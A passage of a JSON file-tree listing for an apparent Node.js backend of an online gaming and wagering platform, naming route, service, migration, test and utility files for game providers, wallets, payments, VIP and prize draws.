          "type": "file"
        },
        {
          "name": "sms.js",
          "path": "src\\middlewares\\sms.js",
          "type": "file"
        },
        {
          "name": "validate.js",
          "path": "src\\middlewares\\validate.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "modules",
      "path": "src\\modules",
      "type": "directory",
      "children": [
        {
          "name": "full_schema.prisma",
          "path": "src\\modules\\full_schema.prisma",
          "type": "file"
        },
        {
          "name": "migrations",
          "path": "src\\modules\\migrations",
          "type": "directory",
          "children": [
            {
              "name": "20250623161703_add_placement_domain_fields",
              "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250623161703_add_placement_domain_fields\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250812141152_add_ticket_record",
              "path": "src\\modules\\migrations\\20250812141152_add_ticket_record",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250812141152_add_ticket_record\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250826152455_add_broadcast_info",
              "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250826152455_add_broadcast_info\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20250915163128_add_cmsemailstaffsetting",
              "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20250915163128_add_cmsemailstaffsetting\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251126124434_guanxi_vip_week",
              "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251126124434_guanxi_vip_week\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251211150940_guanxi_reflux",
              "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20251211150940_guanxi_reflux\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260105173319_guanxi_gameround",
              "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\migrations\\20260105173319_guanxi_gameround\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20260127143818_third_party_user",
              "path": "src\\modules\\migrations\\20260127143818_third_party_user",
              "type": "directory",
              "children": []
            }
          ]
        },
        {
          "name": "published",
          "path": "src\\modules\\published",
          "type": "directory",
          "children": [
            {
              "name": "2025061815",
              "path": "src\\modules\\published\\2025061815",
              "type": "directory",
              "children": [
                {
                  "name": "20250603110847_diff",
                  "path": "src\\modules\\published\\2025061815\\20250603110847_diff",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250603110847_diff\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250605210444_userattrib",
                  "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250605210444_userattrib\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606114838_add_operation_center_r",
                  "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606114838_add_operation_center_r\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250606180317_add_operation_center_r_customerId",
                  "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250606180317_add_operation_center_r_customerId\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250612183505_fix_all_model",
                  "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250612183505_fix_all_model\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250613161515_add_operation_center_r_customer_type",
                  "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025061815\\20250613161515_add_operation_center_r_customer_type\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250618.sql",
                  "path": "src\\modules\\published\\2025061815\\20250618.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025062001",
              "path": "src\\modules\\published\\2025062001",
              "type": "directory",
              "children": [
                {
                  "name": "20250620115524_gx_transaction",
                  "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025062001\\20250620115524_gx_transaction\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025070717",
              "path": "src\\modules\\published\\2025070717",
              "type": "directory",
              "children": [
                {
                  "name": "20250613141103_add_relation_cdkcode",
                  "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250613141103_add_relation_cdkcode\\migration.sql",
                      "type": "file"
                    }
                  ]
                },
                {
                  "name": "20250722113407_guanxi_wager",
                  "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager",
                  "type": "directory",
                  "children": [
                    {
                      "name": "migration.sql",
                      "path": "src\\modules\\published\\2025070717\\20250722113407_guanxi_wager\\migration.sql",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "2025082917",
              "path": "src\\modules\\published\\2025082917",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025082917\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025090814",
              "path": "src\\modules\\published\\2025090814",
              "type": "directory",
              "children": [
                {
                  "name": "20250829173149_wallet",
                  "path": "src\\modules\\published\\2025090814\\20250829173149_wallet",
                  "type": "directory",
                  "children": []
                }
              ]
            },
            {
              "name": "2025091615",
              "path": "src\\modules\\published\\2025091615",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025091615\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251010171400_guanxi_player_rank",
              "path": "src\\modules\\published\\20251010171400_guanxi_player_rank",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251010171400_guanxi_player_rank\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "2025101614",
              "path": "src\\modules\\published\\2025101614",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\2025101614\\migration.sql",
                  "type": "file"
                }
              ]
            },
            {
              "name": "20251215174320_guanxi_account",
              "path": "src\\modules\\published\\20251215174320_guanxi_account",
              "type": "directory",
              "children": [
                {
                  "name": "migration.sql",
                  "path": "src\\modules\\published\\20251215174320_guanxi_account\\migration.sql",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "schema.prisma",
          "path": "src\\modules\\schema.prisma",
          "type": "file"
        }
      ]
    },
    {
      "name": "repositories",
      "path": "src\\repositories",
      "type": "directory",
      "children": []
    },
    {
      "name": "routes",
      "path": "src\\routes",
      "type": "directory",
      "children": [
        {
          "name": "v1",
          "path": "src\\routes\\v1",
          "type": "directory",
          "children": [
            {
              "name": "advertising.route.js",
              "path": "src\\routes\\v1\\advertising.route.js",
              "type": "file"
            },
            {
              "name": "agent.route.js",
              "path": "src\\routes\\v1\\agent.route.js",
              "type": "file"
            },
            {
              "name": "announcement.route.js",
              "path": "src\\routes\\v1\\announcement.route.js",
              "type": "file"
            },
            {
              "name": "appbury.route.js",
              "path": "src\\routes\\v1\\appbury.route.js",
              "type": "file"
            },
            {
              "name": "audienceBaseConfig.route.js",
              "path": "src\\routes\\v1\\audienceBaseConfig.route.js",
              "type": "file"
            },
            {
              "name": "audienceClassification.route.js",
              "path": "src\\routes\\v1\\audienceClassification.route.js",
              "type": "file"
            },
            {
              "name": "audienceGroup.route.js",
              "path": "src\\routes\\v1\\audienceGroup.route.js",
              "type": "file"
            },
            {
              "name": "auth.route.js",
              "path": "src\\routes\\v1\\auth.route.js",
              "type": "file"
            },
            {
              "name": "banner.js",
              "path": "src\\routes\\v1\\banner.js",
              "type": "file"
            },
            {
              "name": "broadcast.route.js",
              "path": "src\\routes\\v1\\broadcast.route.js",
              "type": "file"
            },
            {
              "name": "config.route.js",
              "path": "src\\routes\\v1\\config.route.js",
              "type": "file"
            },
            {
              "name": "dailyCheckIn.route.js",
              "path": "src\\routes\\v1\\dailyCheckIn.route.js",
              "type": "file"
            },
            {
              "name": "dbSnapshot.route.js",
              "path": "src\\routes\\v1\\dbSnapshot.route.js",
              "type": "file"
            },
            {
              "name": "docs.route.js",
              "path": "src\\routes\\v1\\docs.route.js",
              "type": "file"
            },
            {
              "name": "fruitMachineDraw.route.js",
              "path": "src\\routes\\v1\\fruitMachineDraw.route.js",
              "type": "file"
            },
            {
              "name": "game",
              "path": "src\\routes\\v1\\game",
              "type": "directory",
              "children": [
                {
                  "name": "game.route.js",
                  "path": "src\\routes\\v1\\game\\game.route.js",
                  "type": "file"
                },
                {
                  "name": "provider",
                  "path": "src\\routes\\v1\\game\\provider",
                  "type": "directory",
                  "children": [
                    {
                      "name": "evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "facai.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\facai.route.js",
                      "type": "file"
                    },
                    {
                      "name": "index.js",
                      "path": "src\\routes\\v1\\game\\provider\\index.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "inout_jdy.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\inout_jdy.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi.route.js",
                      "type": "file"
                    },
                    {
                      "name": "oneapi_evo.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\oneapi_evo.route.js",
                      "type": "file"
                    },
                    {
                      "name": "pt.route.js",
                      "path": "src\\routes\\v1\\game\\provider\\pt.route.js",
                      "type": "file"
                    }
                  ]
                }
              ]
            },
            {
              "name": "giftcode.route.js",
              "path": "src\\routes\\v1\\giftcode.route.js",
              "type": "file"
            },
            {
              "name": "googlepush.route.js",
              "path": "src\\routes\\v1\\googlepush.route.js",
              "type": "file"
            },
            {
              "name": "inactiveUser.route.js",
              "path": "src\\routes\\v1\\inactiveUser.route.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\routes\\v1\\index.js",
              "type": "file"
            },
            {
              "name": "kefu.route.js",
              "path": "src\\routes\\v1\\kefu.route.js",
              "type": "file"
            },
            {
              "name": "lobby.route.js",
              "path": "src\\routes\\v1\\lobby.route.js",
              "type": "file"
            },
            {
              "name": "mail.route.js",
              "path": "src\\routes\\v1\\mail.route.js",
              "type": "file"
            },
            {
              "name": "online.route.js",
              "path": "src\\routes\\v1\\online.route.js",
              "type": "file"
            },
            {
              "name": "pay.route.js",
              "path": "src\\routes\\v1\\pay.route.js",
              "type": "file"
            },
            {
              "name": "playerRanking.route.js",
              "path": "src\\routes\\v1\\playerRanking.route.js",
              "type": "file"
            },
            {
              "name": "rank.route.js",
              "path": "src\\routes\\v1\\rank.route.js",
              "type": "file"
            },
            {
              "name": "rechargeOrder.route.js",
              "path": "src\\routes\\v1\\rechargeOrder.route.js",
              "type": "file"
            },
            {
              "name": "redPoint.route.js",
              "path": "src\\routes\\v1\\redPoint.route.js",
              "type": "file"
            },
            {
              "name": "slap.route.js",
              "path": "src\\routes\\v1\\slap.route.js",
              "type": "file"
            },
            {
              "name": "sms.route.js",
              "path": "src\\routes\\v1\\sms.route.js",
              "type": "file"
            },
            {
              "name": "test.route.js",
              "path": "src\\routes\\v1\\test.route.js",
              "type": "file"
            },
            {
              "name": "ticket.route.js",
              "path": "src\\routes\\v1\\ticket.route.js",
              "type": "file"
            },
            {
              "name": "turntable.route.js",
              "path": "src\\routes\\v1\\turntable.route.js",
              "type": "file"
            },
            {
              "name": "userGroup.route.js",
              "path": "src\\routes\\v1\\userGroup.route.js",
              "type": "file"
            },
            {
              "name": "userPrivacy.route.js",
              "path": "src\\routes\\v1\\userPrivacy.route.js",
              "type": "file"
            },
            {
              "name": "version.route.js",
              "path": "src\\routes\\v1\\version.route.js",
              "type": "file"
            },
            {
              "name": "vip.route.js",
              "path": "src\\routes\\v1\\vip.route.js",
              "type": "file"
            },
            {
              "name": "wallet.route.js",
              "path": "src\\routes\\v1\\wallet.route.js",
              "type": "file"
            },
            {
              "name": "withdrawOrder.route.js",
              "path": "src\\routes\\v1\\withdrawOrder.route.js",
              "type": "file"
            }
          ]
        }
      ]
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": [
        {
          "name": "advertisingReward.service.js",
          "path": "src\\services\\advertisingReward.service.js",
          "type": "file"
        },
        {
          "name": "agent",
          "path": "src\\services\\agent",
          "type": "directory",
          "children": [
            {
              "name": "agent.service.js",
              "path": "src\\services\\agent\\agent.service.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\services\\agent\\config.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "announcement.service.js",
          "path": "src\\services\\announcement.service.js",
          "type": "file"
        },
        {
          "name": "appbury.service.js",
          "path": "src\\services\\appbury.service.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.service.js",
          "path": "src\\services\\audienceBaseConfig.service.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.service.js",
          "path": "src\\services\\audienceClassification.service.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.service.js",
          "path": "src\\services\\audienceGroup.service.js",
          "type": "file"
        },
        {
          "name": "auth.service.js",
          "path": "src\\services\\auth.service.js",
          "type": "file"
        },
        {
          "name": "banner.service.js",
          "path": "src\\services\\banner.service.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking",
          "path": "src\\services\\behaviorTracking",
          "type": "directory",
          "children": [
            {
              "name": "appsFlyer.service.js",
              "path": "src\\services\\behaviorTracking\\appsFlyer.service.js",
              "type": "file"
            },
            {
              "name": "esEvent.service.js",
              "path": "src\\services\\behaviorTracking\\esEvent.service.js",
              "type": "file"
            },
            {
              "name": "facebookPixel.service.js",
              "path": "src\\services\\behaviorTracking\\facebookPixel.service.js",
              "type": "file"
            },
            {
              "name": "tracking.service.js",
              "path": "src\\services\\behaviorTracking\\tracking.service.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "broadcast.service.js",
          "path": "src\\services\\broadcast.service.js",
          "type": "file"
        },
        {
          "name": "config.service.js",
          "path": "src\\services\\config.service.js",
          "type": "file"
        },
        {
          "name": "crowd",
          "path": "src\\services\\crowd",
          "type": "directory",
          "children": [
            {
              "name": "businessStrategy.js",
              "path": "src\\services\\crowd\\businessStrategy.js",
              "type": "file"
            },
            {
              "name": "BusinessStrategyExecutor.js",
              "path": "src\\services\\crowd\\BusinessStrategyExecutor.js",
              "type": "file"
            },
            {
              "name": "components",
              "path": "src\\services\\crowd\\components",
              "type": "directory",
              "children": [
                {
                  "name": "AudienceFilter.js",
                  "path": "src\\services\\crowd\\components\\AudienceFilter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "CrowdRule.js",
              "path": "src\\services\\crowd\\CrowdRule.js",
              "type": "file"
            },
            {
              "name": "group.js",
              "path": "src\\services\\crowd\\group.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\services\\crowd\\index.js",
              "type": "file"
            },
            {
              "name": "RuleEngine.js",
              "path": "src\\services\\crowd\\RuleEngine.js",
              "type": "file"
            },
            {
              "name": "userAttriPipeline.js",
              "path": "src\\services\\crowd\\userAttriPipeline.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "dailyCheckIn.service.js",
          "path": "src\\services\\dailyCheckIn.service.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.service.js",
          "path": "src\\services\\dbSnapshot.service.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.service.js",
          "path": "src\\services\\fruitMachineDraw.service.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\services\\game",
          "type": "directory",
          "children": [
            {
              "name": "clientView.service.js",
              "path": "src\\services\\game\\clientView.service.js",
              "type": "file"
            },
            {
              "name": "game.service.js",
              "path": "src\\services\\game\\game.service.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\services\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.service.js",
                  "path": "src\\services\\game\\provider\\evo.service.js",
                  "type": "file"
                },
                {
                  "name": "facai.service.js",
                  "path": "src\\services\\game\\provider\\facai.service.js",
                  "type": "file"
                },
                {
                  "name": "inout.service.js",
                  "path": "src\\services\\game\\provider\\inout.service.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.service.js",
                  "path": "src\\services\\game\\provider\\oneapi.service.js",
                  "type": "file"
                },
                {
                  "name": "pt.service.js",
                  "path": "src\\services\\game\\provider\\pt.service.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.service.js",
          "path": "src\\services\\giftcode.service.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.service.js",
          "path": "src\\services\\inactiveUser.service.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\services\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.service.js",
          "path": "src\\services\\kefu.service.js",
          "type": "file"
        },
        {
          "name": "mail.service.js",
          "path": "src\\services\\mail.service.js",
          "type": "file"
        },
        {
          "name": "oneWayPush.service.js",
          "path": "src\\services\\oneWayPush.service.js",
          "type": "file"
        },
        {
          "name": "online.service.js",
          "path": "src\\services\\online.service.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\services\\pay",
          "type": "directory",
          "children": [
            {
              "name": "adapter",
              "path": "src\\services\\pay\\adapter",
              "type": "directory",
              "children": [
                {
                  "name": "Pay21Adapter.js",
                  "path": "src\\services\\pay\\adapter\\Pay21Adapter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "config.js",
              "path": "src\\services\\pay\\config.js",
              "type": "file"
            },
            {
              "name": "goods",
              "path": "src\\services\\pay\\goods",
              "type": "directory",
              "children": [
                {
                  "name": "cash.js",
                  "path": "src\\services\\pay\\goods\\cash.js",
                  "type": "file"
                },
                {
                  "name": "cycleCard.js",
                  "path": "src\\services\\pay\\goods\\cycleCard.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "PaymentAdapter.js",
              "path": "src\\services\\pay\\PaymentAdapter.js",
              "type": "file"
            },
            {
              "name": "paymentAdapterManage.js",
              "path": "src\\services\\pay\\paymentAdapterManage.js",
              "type": "file"
            },
            {
              "name": "stat.js",
              "path": "src\\services\\pay\\stat.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "pay.service.js",
          "path": "src\\services\\pay.service.js",
          "type": "file"
        },
        {
          "name": "playerRanking.service.js",
          "path": "src\\services\\playerRanking.service.js",
          "type": "file"
        },
        {
          "name": "providers",
          "path": "src\\services\\providers",
          "type": "directory",
          "children": [
            {
              "name": "inout.provider.js",
              "path": "src\\services\\providers\\inout.provider.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "push.service.js",
          "path": "src\\services\\push.service.js",
          "type": "file"
        },
        {
          "name": "rank.service.js",
          "path": "src\\services\\rank.service.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.service.js",
          "path": "src\\services\\rechargeOrder.service.js",
          "type": "file"
        },
        {
          "name": "redPoint.service.js",
          "path": "src\\services\\redPoint.service.js",
          "type": "file"
        },
        {
          "name": "redPointBusiness.service.js",
          "path": "src\\services\\redPointBusiness.service.js",
          "type": "file"
        },
        {
          "name": "slap.service.js",
          "path": "src\\services\\slap.service.js",
          "type": "file"
        },
        {
          "name": "sms.service.js",
          "path": "src\\services\\sms.service.js",
          "type": "file"
        },
        {
          "name": "test.service.js",
          "path": "src\\services\\test.service.js",
          "type": "file"
        },
        {
          "name": "ticket",
          "path": "src\\services\\ticket",
          "type": "directory",
          "children": [
            {
              "name": "index.js",
              "path": "src\\services\\ticket\\index.js",
              "type": "file"
            },
            {
              "name": "ticketGrandScheduler.js",
              "path": "src\\services\\ticket\\ticketGrandScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketMajorScheduler.js",
              "path": "src\\services\\ticket\\ticketMajorScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketPoolScheduler.service.js",
              "path": "src\\services\\ticket\\ticketPoolScheduler.service.js",
              "type": "file"
            },
            {
              "name": "ticketSecondaryScheduler.js",
              "path": "src\\services\\ticket\\ticketSecondaryScheduler.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "ticket.service.js",
          "path": "src\\services\\ticket.service.js",
          "type": "file"
        },
        {
          "name": "timerTask.service.js",
          "path": "src\\services\\timerTask.service.js",
          "type": "file"
        },
        {
          "name": "token.service.js",
          "path": "src\\services\\token.service.js",
          "type": "file"
        },
        {
          "name": "transaction.service.js",
          "path": "src\\services\\transaction.service.js",
          "type": "file"
        },
        {
          "name": "turntable",
          "path": "src\\services\\turntable",
          "type": "directory",
          "children": [
            {
              "name": "review.js",
              "path": "src\\services\\turntable\\review.js",
              "type": "file"
            },
            {
              "name": "turntable.service.js",
              "path": "src\\services\\turntable\\turntable.service.js",
              "type": "file"
            },
            {
              "name": "turntableConfig.js",
              "path": "src\\services\\turntable\\turntableConfig.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "userChannel.service.js",
          "path": "src\\services\\userChannel.service.js",
          "type": "file"
        },
        {
          "name": "userGroup.service.js",
          "path": "src\\services\\userGroup.service.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.service.js",
          "path": "src\\services\\userPrivacy.service.js",
          "type": "file"
        },
        {
          "name": "userSource.service.js",
          "path": "src\\services\\userSource.service.js",
          "type": "file"
        },
        {
          "name": "vip.service.js",
          "path": "src\\services\\vip.service.js",
          "type": "file"
        },
        {
          "name": "visualTemplate.service.js",
          "path": "src\\services\\visualTemplate.service.js",
          "type": "file"
        },
        {
          "name": "wallet.service.js",
          "path": "src\\services\\wallet.service.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.service.js",
          "path": "src\\services\\withdrawOrder.service.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": [
        {
          "name": "game.test.js",
          "path": "src\\tests\\game.test.js",
          "type": "file"
        },
        {
          "name": "gameRecord.test.js",
          "path": "src\\tests\\gameRecord.test.js",
          "type": "file"
        },
        {
          "name": "inactive-users-example.js",
          "path": "src\\tests\\inactive-users-example.js",
          "type": "file"
        },
        {
          "name": "inout.test.js",
          "path": "src\\tests\\inout.test.js",
          "type": "file"
        },
        {
          "name": "iopush.server.examples.js",
          "path": "src\\tests\\iopush.server.examples.js",
          "type": "file"
        },
        {
          "name": "iopush.service.enhanced.js",
          "path": "src\\tests\\iopush.service.enhanced.js",
          "type": "file"
        },
        {
          "name": "iopush.test.client.clean.js",
          "path": "src\\tests\\iopush.test.client.clean.js",
          "type": "file"
        },
        {
          "name": "pure.websocket.example.js",
          "path": "src\\tests\\pure.websocket.example.js",
          "type": "file"
        },
        {
          "name": "pushListener.js",
          "path": "src\\tests\\pushListener.js",
          "type": "file"
        },
        {
          "name": "pushTest.js",
          "path": "src\\tests\\pushTest.js",
          "type": "file"
        },
        {
          "name": "pushTestSimple.js",
          "path": "src\\tests\\pushTestSimple.js",
          "type": "file"
        },
        {
          "name": "scheduler.test.js",
          "path": "src\\tests\\scheduler.test.js",
          "type": "file"
        },
        {
          "name": "socket",
          "path": "src\\tests\\socket",
          "type": "directory",
          "children": [
            {
              "name": "iopush.service.back.js",
              "path": "src\\tests\\socket\\iopush.service.back.js",
              "type": "file"
            },
            {
              "name": "iopush.service.pure.websocket.js",
              "path": "src\\tests\\socket\\iopush.service.pure.websocket.js",
              "type": "file"
            },
            {
              "name": "iopush.service.websocket.enhanced.js",
              "path": "src\\tests\\socket\\iopush.service.websocket.enhanced.js",
              "type": "file"
            },
            {
              "name": "README.pure.websocket.md",
              "path": "src\\tests\\socket\\README.pure.websocket.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "sync.js",
          "path": "src\\tests\\sync.js",
          "type": "file"
        },
        {
          "name": "test.js",
          "path": "src\\tests\\test.js",
          "type": "file"
        },
        {
          "name": "test2.js",
          "path": "src\\tests\\test2.js",
          "type": "file"
        },
        {
          "name": "test3.js",
          "path": "src\\tests\\test3.js",
          "type": "file"
        },
        {
          "name": "testCache.js",
          "path": "src\\tests\\testCache.js",
          "type": "file"
        },
        {
          "name": "tranasctionTest.js",
          "path": "src\\tests\\tranasctionTest.js",
          "type": "file"
        },
        {
          "name": "transactionTest.js",
          "path": "src\\tests\\transactionTest.js",
          "type": "file"
        },
        {
          "name": "transactionWagerTest.js",
          "path": "src\\tests\\transactionWagerTest.js",
          "type": "file"
        },
        {
          "name": "userProfile.test.js",
          "path": "src\\tests\\userProfile.test.js",
          "type": "file"
        },
        {
          "name": "userRankingTest.js",
          "path": "src\\tests\\userRankingTest.js",
          "type": "file"
        },
        {
          "name": "websocket.adapter.example.js",
          "path": "src\\tests\\websocket.adapter.example.js",
          "type": "file"
        },
        {
          "name": "websocket.test.client.js",
          "path": "src\\tests\\websocket.test.client.js",
          "type": "file"
        },
        {
          "name": "websocket.upgrade.guide.md",
          "path": "src\\tests\\websocket.upgrade.guide.md",
          "type": "file"
        }
      ]
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": [
        {
          "name": "ApiError.js",
          "path": "src\\utils\\ApiError.js",
          "type": "file"
        },
        {
          "name": "behavior.util.js",
          "path": "src\\utils\\behavior.util.js",
          "type": "file"
        },
        {
          "name": "cashPush.util.js",
          "path": "src\\utils\\cashPush.util.js",
          "type": "file"
        },
        {
          "name": "catchAsync.js",
          "path": "src\\utils\\catchAsync.js",
          "type": "file"
        },
        {
          "name": "commonUtil.js",
          "path": "src\\utils\\commonUtil.js",
          "type": "file"
        },
        {
          "name": "computing.util.js",
          "path": "src\\utils\\computing.util.js",
          "type": "file"
        },
        {
          "name": "decimal.js",
          "path": "src\\utils\\decimal.js",
          "type": "file"
        },
        {
          "name": "elk",
          "path": "src\\utils\\elk",
          "type": "directory",
          "children": [
            {
              "name": "esUtil.js",
              "path": "src\\utils\\elk\\esUtil.js",
              "type": "file"
            },
            {
              "name": "README.md",
              "path": "src\\utils\\elk\\README.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "event.js",
          "path": "src\\utils\\event.js",
          "type": "file"
        },
        {
          "name": "functionSwitch.util.js",
          "path": "src\\utils\\functionSwitch.util.js",
          "type": "file"
        },
        {
          "name": "game.provider.utils.js",
          "path": "src\\utils\\game.provider.utils.js",
          "type": "file"
        },
        {
          "name": "gameBet.util.js",
          "path": "src\\utils\\gameBet.util.js",
          "type": "file"
        },
        {
          "name": "mail.util.js",
          "path": "src\\utils\\mail.util.js",
          "type": "file"
        },
        {
          "name": "memoryGuard.js",
          "path": "src\\utils\\memoryGuard.js",
          "type": "file"
        },
        {
          "name": "merchant.util.js",
          "path": "src\\utils\\merchant.util.js",
          "type": "file"
        },
        {
          "name": "mmdb.util.js",
          "path": "src\\utils\\mmdb.util.js",
          "type": "file"
        },
        {
          "name": "moment.util.js",
          "path": "src\\utils\\moment.util.js",
          "type": "file"
        },
        {
          "name": "monitor.js",
          "path": "src\\utils\\monitor.js",
          "type": "file"
        },
        {
          "name": "normal.util.js",
          "path": "src\\utils\\normal.util.js",
          "type": "file"
        },
        {
          "name": "os.util.js",
          "path": "src\\utils\\os.util.js",
          "type": "file"
        },
        {
          "name": "package.util.js",
          "path": "src\\utils\\package.util.js",
          "type": "file"
        },
        {
          "name": "paginate.js",
          "path": "src\\utils\\paginate.js",
          "type": "file"
        },
        {
          "name": "pick.js",
          "path": "src\\utils\\pick.js",
          "type": "file"
        },
        {
          "name": "recall.js",
          "path": "src\\utils\\recall.js",
          "type": "file"
        },
        {
          "name": "recharge.util.js",
          "path": "src\\utils\\recharge.util.js",
          "type": "file"
        },
        {
          "name": "redis.util.js",
          "path": "src\\utils\\redis.util.js",
          "type": "file"
        },
        {
          "name": "reloadConfigUtil.js",
          "path": "src\\utils\\reloadConfigUtil.js",
          "type": "file"
        },
        {
          "name": "response.js",
          "path": "src\\utils\\response.js",
          "type": "file"
        },
        {
          "name": "rwRule.util.js",
          "path": "src\\utils\\rwRule.util.js",
          "type": "file"
        },
        {
          "name": "serializer.js",
          "path": "src\\utils\\serializer.js",
          "type": "file"
        },
        {
          "name": "sign.util.js",
          "path": "src\\utils\\sign.util.js",
          "type": "file"
        },
        {
          "name": "sort.util.js",
          "path": "src\\utils\\sort.util.js",
          "type": "file"
        },
        {
          "name": "systemHealthMonitor.js",
